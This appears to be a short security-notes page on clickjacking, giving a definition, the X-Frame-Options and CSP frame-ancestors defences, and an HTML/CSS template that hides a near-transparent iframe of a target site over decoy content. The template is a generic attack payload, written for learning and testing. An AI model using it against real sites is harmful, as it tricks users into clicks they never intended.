# Clickjacking

## General

{% hint style="info" %}
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

* Preventions:
  * X-Frame-Options: deny/sameorigin/allow-from
  * CSP: policy/frame-ancestors 'none/self/domain.com'
{% endhint %}

```markup
# An example using the style tag and parameters is as follows:
<head>
  <style>
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
...
<body>
  <div id="decoy_website">
  ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```

